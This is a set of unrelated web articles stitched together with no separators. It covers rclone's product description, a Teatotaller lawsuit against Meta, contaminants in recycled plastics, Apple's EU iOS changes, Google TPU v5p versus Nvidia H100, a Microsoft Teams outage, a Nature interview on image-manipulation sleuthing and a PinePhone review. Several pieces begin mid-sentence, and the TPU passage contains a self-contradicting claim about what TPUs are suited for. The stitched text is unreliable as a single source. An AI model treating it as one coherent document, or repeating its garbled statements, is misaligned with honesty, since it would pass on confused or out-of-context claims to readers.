<h2 id="about">About rclone</h2>
<p>Rclone is a command-line program to manage files on cloud storage. It
is a feature-rich alternative to cloud vendors' web storage
interfaces. <a href="#providers">Over 70 cloud storage products</a> support
rclone including S3 object stores, business &amp; consumer file storage
services, as well as standard transfer protocols.</p>
<p>Rclone has powerful cloud equivalents to the unix commands rsync, cp,
mv, mount, ls, ncdu, tree, rm, and cat. Rclone's familiar syntax
includes shell pipeline support, and <code>--dry-run</code> protection. It is
used at the command line, in scripts or via its <a href="https://rclone.org/rc">API</a>.</p>
<p>Users call rclone <em>"The Swiss army knife of cloud storage"</em>, and
<em>"Technology indistinguishable from magic"</em>.</p>
<p>Rclone really looks after your data. It preserves timestamps and
verifies checksums at all times. Transfers over limited bandwidth;
intermittent connections, or subject to quota can be restarted, from
the last good file transferred. You can
<a href="https://rclone.org/commands/rclone_check/">check</a> the integrity of your files. Where
possible, rclone employs server-side transfers to minimise local
bandwidth use and transfers from one provider to another without
using local disk.</p>
<p>Virtual backends wrap local and cloud file systems to apply
<a href="https://rclone.org/crypt/">encryption</a>,
<a href="https://rclone.org/compress/">compression</a>,
<a href="https://rclone.org/chunker/">chunking</a>,
<a href="https://rclone.org/hasher/">hashing</a> and
<a href="https://rclone.org/union/">joining</a>.</p>
<p>Rclone <a href="https://rclone.org/commands/rclone_mount/">mounts</a> any local, cloud or
virtual filesystem as a disk on Windows,
macOS, linux and FreeBSD, and also serves these over
<a href="https://rclone.org/commands/rclone_serve_sftp/">SFTP</a>,
<a href="https://rclone.org/commands/rclone_serve_http/">HTTP</a>,
<a href="https://rclone.org/commands/rclone_serve_webdav/">WebDAV</a>,
<a href="https://rclone.org/commands/rclone_serve_ftp/">FTP</a> and
<a href="https://rclone.org/commands/rclone_serve_dlna/">DLNA</a>.</p>
<p>Rclone is mature, open-source software originally inspired by rsync
and written in <a href="https://golang.org/">Go</a>. The friendly support
community is familiar with varied use cases. Official Ubuntu, Debian,
Fedora, Brew and Chocolatey repos. include rclone. For the latest
version <a href="https://rclone.org/downloads/">downloading from rclone.org</a> is recommended.</p>
<p>Rclone is widely used on Linux, Windows and Mac. Third-party
developers create innovative backup, restore, GUI and business
process solutions using the rclone command line or API.</p>
<p>Rclone does the heavy lifting of communicating with cloud storage.</p>

It has since closed in Somersworth and now has locations in Dover and Concord. From the beginning, Soldati's business used Instagram heavily as a way to engage and find customers.</p><p>By 2018, Teatotaller had a large following to whom it promoted shows, specials, and other items. Soldati paid Instagram and Facebook for use of the professional platform.</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><cta-atoms-container-inline util-module-path="elements/cta"></cta-atoms-container-inline><p>When he first found himself unable to log in to his account in June 2018, he thought there was some kind of technical glitch.</p><p>“Over the course of 24 hours realizing it was deleted, I was very concerned,” Soldati said. All users could see when they tried to look at the account was a blank screen. “And so, you know, anyone might assume we don't exist anymore or we closed or whatnot and all of the shows and events and specials that we were just sort of planning to engage with our audience, we didn't have that line of communication.”</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="600" outstream="" momentum=""></partner-banner><p>Having no luck with Instagram's help support, he decided to file a small claim in the Dover District Court, thinking Facebook would “get the memo” and either give the account back or pay him a couple hundred bucks to repay him for lost revenue.&nbsp;</p><p><strong>“</strong>What was interesting is after I filed that claim, Facebook's response to it was so enormous and sort of so disproportionate to what I was, at the time, ultimately claiming: in their eyes, a relatively small account, small business owner just seeking a quick fix,” Soldati said. “And they sort of threw the book at me and had this massive memo and motion to dismiss that had like 10 points of why Facebook doesn't owe me anything. That was the moment that I realized that I had sort of struck some kind of nerve.”</p><h2>How did Soldati beat Facebook?</h2><p>Despite Facebook hiring several law firms to defend their case, Soldati, representing himself, was able to successfully argue Meta/Facebook committed a breach of contract and that they were not immune under the Communications Decency Act.</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>Soldati argued that by deleting his account with no explanation or warning, Meta had broken its contract set in the terms of service, and therefore was a breach of contract. In response, Meta claimed Soldati had accidentally deleted the account himself. But Soldati had screenshots from the day his account was deleted.</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>“The defendant provided two conflicting reasons for the deletion and was unable to specify a clear reason for the deletion,” read the court’s final order. “This court finds that the plaintiff has met their burden showing that they did not delete their own account.”</p><p>The court ruled in favor of Soldati that Facebook had committed a breach of contract.&nbsp;&nbsp;</p><p>Meta also argued it was immune to any cases brought against them under section 230 of the Communications Decency Act (CDA), which is often used to obtain immunity from claims involving the publishing or deletion of material on its platforms.</p><p>When Soldati originally filed his claim in the Dover District Court in 2018, it was dismissed under this section. But when he appealed it to the New Hampshire Supreme Court, they decided that Facebook was actually<a href="https://www.fosters.com/story/news/2020/07/24/teatotaller-gets-nh-supreme-court-win-over-facebook-instagram-which-deleted-cafersquos-account/113763892/"> not immune from liability</a> under the CDA. This win send the case back to the Dover District Court to issue a ruling on the small claim.</p><p>This time, the Dover District Court found Meta didn’t keep its promise to Teatotaller and deleted the account “without sufficient basis, and inconsistent with the reasons they have provided in the&nbsp;<em>Terms of Use.”</em></p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>The order ends, “Accordingly, the defendant is not entitled to immunity under the CDA.”&nbsp;</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>Meta’s motion to dismiss also included some other arguments Soldati calls “bogus.” It argued Instagram and Facebook (now Meta) aren’t the same company, but Facebook bought Instagram in 2012, six years before Soldati’s account was deleted. It also argued Meta doesn’t do any business in New Hampshire, but it markets and advertises to New Hampshire users. The company also argued Facebook is a free service which nobody pays for, but Soldati and other professional account owners do pay. These arguments ultimately failed.</p><h2>So why did Facebook delete Teatotaller’s account?</h2><p>Meta never gave an explanation for why it deleted Teatotaller's account.</p><p>While Teatotaller is known for supporting LGBTQ rights and has had&nbsp;<a href="https://www.fosters.com/story/news/2018/01/08/vandals-strike-somersworth-billboard/16354567007/">daring billboards promoting the business vandalized</a>, Soldati doesn’t think that was the reason for the deletion.</p><p>“It’s very possible that Facebook just screwed up,” Soldati said, but he thinks the company wouldn’t want to admit that.</p><p><strong>“</strong>If Facebook made a technological misstep that damaged the integrity of some of their users accounts, that's a credibility risk and it's a shareholder risk,” Soldati said. “And so I think a big aspect of this and why they shifted to trying to pretend that I deleted the account was because the true reason of its deletion could actually be something that undermines the promise that they claim to bring the users that, 'Hey, don't worry, as long as you follow the rules and don't post offensive material, whatever, you're good. And we're going to keep your account safe. We're going to keep your account active.'”</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><h2>What does this win mean for Soldati and other Facebook users?</h2><p>The District Court's ruling awarded Soldati $100 plus costs, and Soldati said the final amount is still pending. He said it will probably be just a few hundred dollars, maybe a few thousand dollars.</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>It’s nothing compared to the time he’s spent on the case, or what his business lost from the initial account deletion. To him, what’s more important is the repercussions of this decision.&nbsp;</p><p>The New Hampshire Supreme Court is now the highest court to have decided against Facebook’s CDA defense, according to Soldati.&nbsp;</p><p><strong>“</strong>I can be happy about the hundreds of dollars I put in my pocket. But ultimately, this will sort of stand as an example of like, they can't continue to throw the book at people and say, 'No, you don't have a claim here because we're immune,'” said Soldati. “Because now people can point to the New Hampshire Supreme Court and a small claims court in Dover, New Hampshire, and say here a judge found that you didn't pass the test.”</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>Soldati said he hopes courts start to see Meta as a monopoly.

<div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Plastic pollution is a menace worldwide. Plastics are now <a href="https://www.science.org/doi/10.1126/science.abg5433">found</a> in every <a href="https://pubs.acs.org/doi/10.1021/acs.est.1c04158">environment</a> on the planet, from the deepest seas to the atmosphere and human bodies. </p>

<p>Scientific evidence <a href="https://doi.org/10.5334/aogh.4056">describing harm</a> to the environment and humans is growing. Hence, the United Nations has <a href="https://wedocs.unep.org/bitstream/handle/20.500.11822/39812/OEWG_PP_1_INF_1_UNEA%20resolution.pdf">resolved</a> to <a href="https://enb.iisd.org/negotiations/international-legally-binding-instrument-plastics-pollution-including-marine#:%7E:text=The%20United%20Nations%20Environment%20Assembly,pollution%2C%20including%20in%20the%20marine">negotiate</a> a legally binding instrument to end plastic pollution.  </p>

<p>Strategies to achieve this goal include provisions throughout the plastics lifespan: production, use, waste management and remediation. </p>

<p>In designing rules for managing plastic, it’s important to understand that plastic materials and waste streams are complex. Not all plastics are the same. And recycled plastics are not necessarily “better” – less harmful – than virgin plastics. If they contained harmful chemicals to begin with, recycling doesn’t make them less harmful. And sometimes they are contaminated by other substances.</p>

<p>We conducted a <a href="https://www.sciencedirect.com/science/article/pii/S2352340923008090?via%3Dihub">study</a> identifying and measuring the concentration of contaminants in recycled pellets from 28 small-scale recycling facilities in the global south. Plastic waste is often exported from high income countries to less developed countries, with few to no requirements for reporting their makeup.</p>

<p>Our investigation covered facilities in Cameroon, Mauritius, Nigeria, Tanzania and Togo in Africa as well others in Asia, Europe and South America. </p>

<p>We found 191 pesticides, 107 pharmaceuticals and 81 industrial compounds among many others in the recycled plastic pellets. Many of these chemicals could be hazardous and make the plastics unsuitable for reuse.</p>

<p>This finding can inform regulations for recycled plastics. The chemical composition of the plastic should be checked before it is recycled. </p>

<h2>Chemicals used in production of plastics</h2>

<p>More than <a href="https://www.unep.org/resources/report/chemicals-plastics-technical-report">13,000 chemicals</a> are currently used in the production of plastic materials and products. They can include thousands of plastics additives – but also substances that are added unintentionally. Some unwanted chemicals form during the production or life of plastics. Thousands of these chemicals have dangerous properties. The health risks of some others are unknown. </p>

<p>Throughout the plastics value chain, during production, use, waste and recycling, other chemicals can contaminate the material too. The result may be recycled materials whose chemical composition is unknown. </p>

<p>Previous studies have reported the presence of <a href="https://doi.org/10.1016/j.jhazmat.2017.10.014">plastics additives</a> in recycled materials. Among them were chemicals that are <a href="https://www.unep.org/explore-topics/chemicals-waste/what-we-do/emerging-issues/endocrine-disrupting-chemicals">known</a> to have <a href="https://www.epa.gov/endocrine-disruption/overview-endocrine-disruption">negative effects on health</a>. Examples include <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0055387">phthalates</a> (plastic softeners), bisphenols like <a href="https://www.sciencedirect.com/science/article/pii/S0303720706002292">BPA</a>, and <a href="https://www.sciencedirect.com/science/article/pii/S0048969721044478?via%3Dihub">UV-stabilisers</a> used to protect plastics from sun damage and yellowing.</p>

<p>In our work, we established the presence of chemicals in recycled plastic that can cause harm to humans or other organisms. They include pesticides, pharmaceuticals and fragrances. Others are chemicals that result from burning natural materials, man-made organic chemicals used for industrial applications like paint, and ultraviolet filters.</p>

<p>We quantified a total of 491 different chemical substances. Some had specific uses and others formed from the breakdown of products.</p>

<p>Some national and regional policies <a href="https://www.basel.int/Implementation/Plasticwaste/Globalgovernance/tabid/8335/Default.aspx">regulate</a> the allowable concentration of hazardous chemicals in specific plastic products. But only 1% of plastics chemicals are subject to international regulation in existing multilateral environmental agreements. Policies don’t adequately address the issue of transparent reporting of chemicals in plastics across their value chain. Also, there are no laws to govern monitoring of chemicals in recycled materials. This is a <a href="https://www.science.org/doi/10.1126/science.adk9846">serious gap</a> in oversight. Stronger and more globally coordinated measures are necessary. </p>

<p>Our findings emphasise the importance of regulating mechanical recycling, as many of the substances measured were contaminants and not plastic additives. Many of the chemicals we identified may have contaminated the materials during use. For example, a jug used for storing pesticides will absorb some of the pesticides and will contaminate the recycling waste stream. Plastics in the environment are also known to absorb <a href="https://www.sciencedirect.com/science/article/pii/S0025326X11005960">organic pollutants</a>. </p>

<p>To assess the quality of recycled plastics, it’s crucial to know which chemicals are present and in what concentrations. This information can guide regulations about how recycled plastics may be used. It will also be valuable for plastics producers, waste management workers (including recyclers), consumers, and the scientific community.</p>

<h2>A path towards safer reuse of plastics</h2>

<p>To recycle more materials safely, several changes are necessary. These include:</p>

<ul>
<li><p>increased transparency regarding the use of chemicals and their risks </p></li>
<li><p>chemical simplification of the plastics market, so that fewer and less toxic chemicals are permitted for use</p></li>
<li><p>improved waste management infrastructure with separated waste streams  </p></li>
<li><p>improved recycling methods, including monitoring of hazardous chemicals.</p></li>
</ul>

<p>Chemical simplification of plastic additives will promote sustainability, safety and regulatory compliance. It will help manufacturers to minimise the environmental impact and adverse health effects of complex chemical formulations. Simpler chemical structures also improve the recycling potential of plastics and make recycling more efficient and cost-effective.</p>

<p><a href="https://pubs.acs.org/doi/full/10.1021/acs.est.1c04903">Chemical simplification</a> can also reduce potential health risks in the disposal of plastic materials. </p>

<p>From a regulatory perspective, chemical simplification supports clearer and more enforceable safety guidelines.</p>

<p>It’s is a crucial step towards the sustainable production and use of plastics, as  countries work towards a legal instrument to end pollution.</p>

<div id="readability-page-1" class="page"><div><p>Apple’s new rules in the European Union mean browsers like Firefox can finally use their own engines on iOS. Although this may seem like a welcome change, Mozilla spokesperson&nbsp;Damiano DeMonte tells <em>The Verge</em> it’s “extremely disappointed” with the way things turned out.</p><p>“We are still reviewing the technical details but are extremely disappointed with Apple’s proposed plan to restrict the newly-announced BrowserEngineKit to EU-specific apps,” DeMonte says. “The effect of this would be to force an independent browser like Firefox to build and maintain two separate browser implementations — a burden Apple themselves will not have to bear.”</p><p>In iOS 17.4, <a href="https://www.theverge.com/2024/1/25/24050478/apple-ios-17-4-browser-engines-eu">Apple will no longer force browsers</a> in the EU to use WebKit, the underlying engine that powers Safari. The change opens the door for other popular engines, such as Blink, which is used by Google Chrome and Microsoft Edge, as well as Gecko, the engine used by Firefox. It also means third-party browsers could become fully functional on iOS without any of the limitations that come along with WebKit. </p><p>Despite this, Mozilla argues that rolling out the changes only in the EU will make it more difficult for browsers to juggle different versions. “Apple’s proposals fail to give consumers viable choices by making it as painful as possible for others to provide competitive alternatives to Safari,” DeMonte adds. “This is another example of Apple creating barriers to prevent true browser competition on iOS.”</p><p>Mozilla isn’t the <a href="https://www.theverge.com/24051818/apple-app-store-dma-eu-developer-response">only developer critical of Apple’s new rules</a>, which also extend to game streaming apps, alternative app stores, and sideloading. Epic CEO Tim Sweeney called the new terms a “horror show,” while <a href="https://newsroom.spotify.com/2024-01-26/apples-proposed-changes-reject-the-goals-of-the-dma/">Spotify said the changes</a> are a “farce.” Apple’s guidelines are still pending approval by the EU Commission.</p></div></div>]]></description>

<p>Yesterday, <a href="https://9to5mac.com/2024/01/25/third-party-iphone-app-stores-ios-17-4/" target="_blank" rel="noreferrer noopener">Apple announced</a> some major changes to the App Store and the broader iPhone platform in the European Union, including support for alternative app marketplaces. There’s one piece of nuance that Apple is now clarifying.&nbsp;</p>



<p>Some of these changes are coming to all of Apple’s platforms, while others are coming <em>only</em> to the iPhone and not the iPad.</p>



<p>There is reason for this nuance. Apple explains that the European Union ruled that iOS is a gatekeeper platform as part of the Digital Markets Act. This applies only to iOS on the iPhone. iPadOS on the iPad is a completely different platform in the eyes of Apple and the European Commission.&nbsp;</p>



<p>On the other hand, the Digital Markets Act designates the entirety of the App Store as a gatekeeper service. In the eyes of the European Commission, this includes the App Store across all of Apple’s platforms: iPhone, iPad, Mac, Apple Watch, and Apple TV.</p>




	<p>With that in mind, Apple has bifurcated these changes based on the requirements of the DMA. Changes coming to the App Store are coming to all of Apple’s platforms, while changes to the iPhone are coming <em>only</em> to the iPhone, even if iOS shares a lot of the same codebase as iPadOS.</p>



<p>Here’s what that means in practice.</p>



<ul>
<li>The ability to install third-party app marketplaces and download apps from third-party app marketplaces will be an option <em>only</em> on the iPhone.</li>



<li>The new <a href="https://9to5mac.com/2024/01/26/apple-shares-more-details-about-the-new-default-web-browser-prompt-in-ios-17-4/" target="_blank" rel="noreferrer noopener">prompt in Safari</a> that asks users to pick a default browser engine is coming <em>only</em> to the iPhone.</li>



<li>Support for third-<a href="https://9to5mac.com/2024/01/25/third-party-default-browsers-engines/" target="_blank" rel="noreferrer noopener">party browser engines</a> is coming <em>only</em> to the iPhone.</li>



<li>The ability to set default NFC and wallet apps will <em>only</em> be available on the iPhone.</li>



<li>Changes to App Store policy to allow <a href="https://9to5mac.com/2024/01/25/apple-announces-reduced-commission-structure-for-apps-europe/" target="_blank" rel="noreferrer noopener">alternative payments and lower commissions</a> affect the App Store across all Apple platforms.</li>



<li>Changes to the App Store guidelines to allow <a href="https://9to5mac.com/2024/01/25/apple-game-streaming-app-store/" target="_blank" rel="noreferrer noopener">game streaming apps</a> impact all of Apple’s platforms.</li>
</ul>



<p>All of these changes are coming as part of iOS 17.4, which is <a href="https://9to5mac.com/2024/01/25/ios-17-4-beta-1-new-features/">currently available in developer beta testing</a>.</p>

This is a supercomputing architecture that's built specifically to run AI applications, rather than supercomputers which normally run scientific workloads, because TPUs are unsuited to this.</p><p>The latest version of its TPU has 8,960 chips per pod (which comprise the system), versus 4,096 in v4, and it's four times as scalable in terms of total availability of FLOPs per pod. These new pods provide a throughput of 4,800Gbps. The new pods also have 95GB of high-bandwidth memory (HBM) versus 32GB HBM RAM in TPU v4.&nbsp;</p><h2 id="nvidia-h100-vs-google-tpu-v5p-which-is-faster-3">Nvidia H100 vs Google TPU v5p: Which is faster?</h2><p>Unlike <a data-analytics-id="inline-link" href="https://www.techradar.com/tag/nvidia" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.techradar.com/tag/nvidia">Nvidia</a>, which offers its GPUs out for other companies to purchase, Google's custom-made TPUs remain in-house for use across its own products and services. Google's TPUs have long been used to power its services including Gmail, <a data-analytics-id="inline-link" href="https://www.techradar.com/tag/youtube" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.techradar.com/tag/youtube">YouTube</a> and Android, and the latest version has also been used to train Gemini.&nbsp;</p><p>Google's v5p TPUs are up to 2.8 times faster at training large language models than TPU v4, and offer 2.1-times value-for-money. Although the intermediary version, TPU v5e, released earlier this year, offers the most value for money of all three, it's only up to 1.9-times faster than TPU v4, making TPU v5p the most powerful.</p><p>It's even powerful enough to rival Nvidia's widely in-demand H100 GPU, which is one of the <a data-analytics-id="inline-link" href="https://www.techradar.com/news/computing-components/graphics-cards/best-graphics-cards-1291458" data-before-rewrite-localise="https://www.techradar.com/news/computing-components/graphics-cards/best-graphics-cards-1291458"><u>best graphics cards</u></a> out there for AI workloads. This component is four times faster at training workloads than Nvidia's A100 GPU, according to <a data-analytics-id="inline-link" href="https://resources.nvidia.com/en-us-tensor-core/nvidia-tensor-core-gpu-datasheet" target="_blank" data-url="https://resources.nvidia.com/en-us-tensor-core/nvidia-tensor-core-gpu-datasheet"><u>the company's own data</u></a>.&nbsp;</p><p>Google's TPU v4, meanwhile, is estimated to be between 1.2 and 1.7-times faster than the A100, according to <a data-analytics-id="inline-link" href="https://arxiv.org/abs/2304.01433" target="_blank" data-url="https://arxiv.org/abs/2304.01433"><u>research it published in April</u></a>. Incredibly rough calculations would suggest the TPU v5p, therefore, is roughly between 3.4 and 4.8-times faster than the A100 – which makes it on par or superior to the H100, although more detailed benchmarking is needed before any conclusions can be drawn.</p><h3 id="section-more-from-techradar-pro"><span>More from TechRadar Pro</span></h3><ul><li><a href="https://www.techradar.com/computing/artificial-intelligence/what-is-google-gemini" data-before-rewrite-localise="https://www.techradar.com/computing/artificial-intelligence/what-is-google-gemini">What is Google Gemini?</a> Everything you need to know about Google’s next-gen AI</li><li>These are the <a href="https://www.techradar.com/news/computing-components/graphics-cards/best-graphics-cards-1291458" data-before-rewrite-localise="https://www.techradar.com/news/computing-components/graphics-cards/best-graphics-cards-1291458">best graphics cards</a> out there that you can buy</li><li><a href="https://www.techradar.com/news/computing-components/graphics-cards/amd-vs-nvidia-who-makes-the-best-graphics-cards-699480" data-before-rewrite-localise="https://www.techradar.com/news/computing-components/graphics-cards/amd-vs-nvidia-who-makes-the-best-graphics-cards-699480">AMD vs Nvidia</a>: who is the graphics card champion?</li></ul>

<p>Microsoft is investigating an ongoing and widespread outage impacting the users of its Teams communication platform and causing connectivity issues, login problems, and message delays.</p>
<p>While Redmond is still working on addressing these ongoing problems, it revealed that a networking issue might be the root cause of this outage.</p>
<p>"We've identified a networking issue impacting a portion of the Teams service and we're performing a failover to remediate impact. Additional information can be found under TM710344 in the admin center," <a href="https://twitter.com/MSFT365Status/status/1750931051210228178" target="_blank" rel="nofollow noopener">tweeted</a> the official Microsoft account for updates on Microsoft 365 service incidents.</p>
<p>Affected customers have reported login and server connection issues, desktop and mobile Teams apps freezing on the loading screen, and message delivery problems.</p>
<p>Other reports mention chat history not being available and images no longer displaying in chat, as well as being left in the waiting room after joining Teams meetings.</p>

<p>On impacted systems, customers see "We've run into a server error. Some functions might not work right now but you can continue to use the app" errors.</p>
<p>According to the&nbsp;TM710344 incident report in the Microsoft 365 admin center, the outage was first acknowledged by Redmond at&nbsp;10:37 AM EST and it&nbsp;impacts customers across&nbsp;North America, Europe, the Middle East, and Africa regions.</p>
<p>The outage affects users performing a cold boot, who may not be able to log into teams and will see an "oops" page. It also causes users attempting to log into their accounts and unlocking devices to see missing messages.</p>
<p>Other scenarios experienced by impacted customers can lead to:</p>
<ul><li>Users may fail to load messages in channels and chats</li>
<li>Users are unable to view or download their media (images, videos, audio, call recordings, code snippets)</li>
<li>Some messages may experience delays being sent</li>
<li>Call Recordings might take longer to appear in user's OneDrive for Business and SharePoint Online</li>
<li>Bots may be unable to download attachments</li>
<li>Sending and receiving read receipt notifications may be delayed</li>
</ul><p>"Our review of service telemetry indicates a portion of database infrastructure that facilitates multiple APls is experiencing a networking issue, resulting in impact," Microsoft said.</p>
<p>"We're continuing our investigation to isolate the underlying cause of the networking issue and develop remediation actions."</p>
<p><em>Update&nbsp;January 26, 12:55 EST: </em>Added&nbsp;TM710344 incident report&nbsp;info.</p>
<p><em>Update&nbsp;January 26, 13:28 EST:</em> Microsoft says it's working on addressing the server issues and is seeing signs of improvement.</p>
<p>"We've completed the failover in the EMEA region and service telemetry is showing some improvement. The failovers for the North and South America regions are ongoing and we continue to monitor," the company <a href="https://twitter.com/MSFT365Status/status/1750947382588571976" target="_blank" rel="nofollow noopener">tweeted</a>.</p>
<p><em>Update&nbsp;January 26, 14:21 EST: </em>Added details on more affected scenarios shared by Microsoft on the <a href="https://portal.office.com/servicestatus" target="_blank" rel="nofollow noopener">service health portal</a>.</p>

The news came after scientific-image sleuth Sholto David <a href="https://forbetterscience.com/2024/01/02/dana-farberications-at-harvard-university/" data-track="click" data-label="https://forbetterscience.com/2024/01/02/dana-farberications-at-harvard-university/" data-track-category="body text link">posted his concerns</a> about more than 50 manuscripts to a blog on 2 January.</p><p>In the papers, published in a range of journals including <i>Blood</i>, <i>Cell</i> and <i>Nature Immunology</i>, David found images from western blots — a common test for detecting proteins in biological samples — in which bands seemed to be spliced, stretched and copied and pasted. He also found images of mice duplicated across figures where they shouldn’t have been. (<i>Nature</i>’s news team is editorially independent of its publisher, Springer Nature, and of other Nature-branded journals.)</p><figure>

</figure><p>It was not the first time that some of these irregularities had been noted; some were flagged years ago on PubPeer, a website where researchers comment on and critique scientific papers. The student newspaper <i>The Harvard Crimson</i> <a href="https://www.thecrimson.com/article/2024/1/12/dana-farber-research-misconduct-allegations/" data-track="click" data-label="https://www.thecrimson.com/article/2024/1/12/dana-farber-research-misconduct-allegations/" data-track-category="body text link">reported on David’s findings</a> on 12 January.</p><p>The DFCI, an affiliate of Harvard University, had already been investigating some of the papers in question before David’s blogpost was published, says the centre’s research-integrity officer, Barrett Rollins. “Correcting the scientific record is a common practice of institutions with strong research-integrity processes,” he adds. (Rollins is a co-author of three of the papers that David flagged and is not involved in investigations into them, says DFCI spokesperson Ellen Berlin.) The DFCI is declining requests for interviews with its researchers about the retractions.</p><p>David, based in Pontypridd, UK, spoke to <i>Nature</i> about how he uncovered the data irregularities at the DFCI and what scientists can do to prevent mix-ups in their own work.</p><h2>You’ve said that you’re doing data sleuthing full-time. How did you get into it?</h2><p>I’m not doing anything else. I did my PhD in cellular molecular biology at Newcastle University [UK], and I finished that in 2019. And then I went to work for Oxford Biomedica [a UK gene- and cell-therapy company]. I was there for three years and then I moved out here to Wales. Since then, I’ve been doing this image stuff. I’m not doing this nine to five, but I am pretty busy with it.</p><p>I used to write letters to the editor [at journals], but it’s a very infuriating process. So, it’s through getting frustrated that I discovered PubPeer.</p><h2>You recently left your 2,000th comment on PubPeer. What keeps you coming back?</h2><p>I enjoy the ridiculous back and forth with the authors over e-mail. I care a lot about the animals [that are killed for life-sciences experiments] as well. The level of expectation we should have when we’re dealing with animals and high-profile institutions is that they’re super careful and that they get things right, so it’s frustrating when you see errors.</p><h2>What’s your usual process when you’re combing through a paper?</h2><p>It’s going to depend on the problem that I might expect to find. A few months ago, [the open-access journal] <a href="https://forbetterscience.com/2023/11/17/schneider-shorts-17-11-2023-this-brilliant-scientist-has-been-punished-enough/#plos" data-track="click" data-label="https://forbetterscience.com/2023/11/17/schneider-shorts-17-11-2023-this-brilliant-scientist-has-been-punished-enough/#plos" data-track-category="body text link"><i>PLoS One</i> retracted nine papers</a>, and these were all to do with gastric-damage stuff. In that case, I was looking for image reuse between papers. I went and I got all of this guy’s papers, and I cropped all of the images out of all the papers, put it in a giant folder and then resized them all. And I used a script to feed it into Imagetwin [<a href="https://www.nature.com/articles/d41586-023-02920-y" data-track="click" data-label="https://www.nature.com/articles/d41586-023-02920-y" data-track-category="body text link">software that compares images</a> with a database of more than 25 million others]. But for the DFCI stuff, a lot of what I found and what had been previously posted [on PubPeer] is duplicated images within the same paper. Imagetwin is really useful for these things.</p><p>I note and collect the errors on PubPeer, write a blog, send the blog to the publisher and university. What I’m hoping for is that the authors respond on PubPeer. If I see a really credible, active response on PubPeer, then I’d probably just leave it there.</p><h2>Thinking about the DFCI papers, what pattern of potential image manipulation stood out to you the most?</h2><p>There is one where there’s images of mice, and it looks like one of them has been copied lots of times, and there’s a bioluminescent signal that’s been superimposed on top. It’s got the ears in the same place. It’s almost certainly the same mouse in about five different pictures in different groups and different time points. In [another paper], you’ve got a western-blot figure, and the same band has appeared multiple times across the whole lot. Not just one splice or one clumsy copy and paste; it’s the same band that has been superimposed into that block quite carefully.</p><figure>

</figure><h2>What did you think of the DFCI’s acknowledgement that it would seek retractions for 6 papers and corrections for 31 others?</h2><p>I’ve flagged about 58 papers. In 16 or 17 of those, they say the data was collected at other institutions. Three of them, they dispute. I accept that. But I’d like to know what the dispute is. [The DFCI did not respond to explain why it disagrees with the anomalies flagged by David. It also said that one further paper is still under examination.]</p><p>So that seems like it’s pretty much all of them accounted for. In one sense, I’m relieved. They basically accepted that these are all errors. I stand by what’s on the blog and by what I post on PubPeer.</p><p>It does leave a frustrated feeling because a lot of these comments have been on PubPeer for ages. But now, suddenly, after the blogpost, Rollins has said, ‘we’ve known about some of these concerns’. Why does it take some nobody like me dropping a blog to make them start doing this? [Berlin didn’t immediately respond to questions on when the DFCI’s investigation began or how many papers the institute was investigating before David published his blogpost.]</p><h2>Do you think journals are doing enough to correct the scientific record when these cases come up?</h2><p>The response is usually slow, if they respond at all. It’s a very painful process to try to report an accusation of image duplication. It’d be nice if there was an obvious way just to click a button and flag a paper. It would be nice if you could leave a comment on the journal’s page, because how many people read PubPeer?</p><h2>How can scientists avoid accusations of data impropriety?</h2><p>There’s a pretty simple way to preventing all of this: you should design some file-organizing system that involves giving research images a sensible name. And then when it comes to checking your paper before you publish it, you need to trace back all the images to the raw data and check them against the metadata. For example, if you have a photo labelled as ‘Day three’, does that correspond to the date the photo was taken or that the experiment happened on?</p><h2>Do you have any recommendations for scientists whose work is questioned?</h2><p>I don’t want to make an environment where people feel harassed. The main thing I’d like to see is a polite response, and to acknowledge whether the error is there or not. Because it’s very frustrating if you say, ‘We’ll look into this,’ without acknowledging the errors on the page or giving a timeline.</p>

<h2>PinePhone - Post daily driver review</h2>
<p>Review of PinePhone after a month of daily driving.</p>

<p>All opinions are my own, and most of the review is for my own use-cases. There are some comparisons, mostly for entertainment purposes, to iOS (based on my previous device, iPhone 12 Pro) and Android (based on my current device, de-googled OnePlus Nord N10 5G). </p>
<br>
<h2>Verdict</h2>
<p>PinePhone is a great mobile Linux device. I would use it as my daily driver, and probably iron out some issues I ran into, but for me, it failed at... being a phone. I had repeated, unpredictable problems both placing and receiving calls, and I could not resolve them. See below for details.</p>
<br>
<h2>Hardware</h2>
<p>3GB RAM Convergence edition original PinePhone rev 1.2B.</p>

<br>
<h3>Body</h3>
<p>TLDR: Plastic, pretty standard for mid level phone.</p>
<p>Well-made, pretty standard dimensions, is a bit slippery, but buttons have a good feel to them. It would be great with a grippy case.</p>
<p>Having all three buttons on the right side makes it convenient for environments like SXMO, which uses buttons for navigating menus.</p>
<br>
<h3>Display</h3>
<p>TLDR: Okay, difficult to see in bright light.</p>
<p>After ultra-smooth modern phone touchscreens, PinePhone's screen protector feels strange, but is nothing unusual. (You can take it off or replace it with a glass one for more glossy feel)</p>
<p>The display itself is an IPS panel. Not as colorful as OLED, but not as expensive or power-hungry, either. My only complaint is that it's difficult to see in bright light, so I kept the light theme for everything.</p>
<br>
<h3>Battery</h3>
<p>TLDR: Eh. Enough for occasional texting and short calls. Plug in otherwise.</p>
<p>Not great, but not terrible. At first, and when traveling, I carried a power bank with me, but rarely needed it. If you use the phone to occasionally text and chat, you are OK. Browser and WiFi are the two things that noticeably drain the battery. Often, if not actively using bandwidth, I think it makes sense to turn WiFi off.</p>
